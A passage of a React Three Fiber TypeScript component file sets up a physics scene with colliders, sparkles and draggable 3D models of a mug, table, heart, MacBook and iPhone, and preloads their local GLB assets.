        lookOff={[0, 0.2, 0]}
      />
      <MugSteam body={rigidBodyRef} rimY={rimY} width={mugWidth} />
      <RigidBody ref={rigidBodyRef} position={[2.5, 4.0, 0.7]} restitution={0.2} friction={1.0} linearDamping={0.5} angularDamping={0.5} colliders="cuboid">
        <group ref={groupRef}>
          <primitive
            object={cloned}
            scale={MUG_SCALE}
            onPointerEnter={() => { hoverRef.current = true; }}
            onPointerLeave={() => { hoverRef.current = false; }}
            onPointerDown={(e: ThreeEvent<PointerEvent>) => {
              start.current = { x: e.clientX, y: e.clientY };
              drag.onPointerDown(e);
            }}
            onPointerUp={(e: { clientX: number; clientY: number }) => {
              const d = Math.hypot(e.clientX - start.current.x, e.clientY - start.current.y);
              if (d < 5 && !mugFocused && !anyOtherFocused) setMugFocused(true);
            }}
          />
        </group>
      </RigidBody>
    </>
  );
}


export default function PhysicsModels() {
  return (
    <>
      {/* Physics floor — bare collider, no mesh so nothing occludes stars */}
      <RigidBody type="fixed" position={[0, -2, 0]}>
        <CuboidCollider args={[20, 0.1, 10]} />
      </RigidBody>
      {/* Invisible walls keep thrown objects in view */}
      <RigidBody type="fixed">
        <CuboidCollider args={[0.2, 15, 4]} position={[-7, 13, 0]} />
        <CuboidCollider args={[0.2, 15, 4]} position={[7, 13, 0]} />
        <CuboidCollider args={[7, 15, 0.2]} position={[0, 13, -3.6]} />
        <CuboidCollider args={[7, 15, 0.2]} position={[0, 13, 3.6]} />
      </RigidBody>

      <DimPlane />
      {/* Dust drifting through the key light */}
      <Sparkles count={70} scale={[14, 7, 6]} position={[0, 2, 0]} size={2.2} speed={0.25} opacity={0.45} noise={1} color="#ffe8c8" />
      <TableModel />
      <HeartV2Model />
      <MacBookModel />
      <IPhoneModel />
      <MugModel />
    </>
  );
}

useGLTF.preload("/assets/iphone.glb");
useGLTF.preload("/assets/macbook.glb");
useGLTF.preload("/assets/heart.glb");
useGLTF.preload("/assets/table.glb");
useGLTF.preload("/assets/mug.glb");
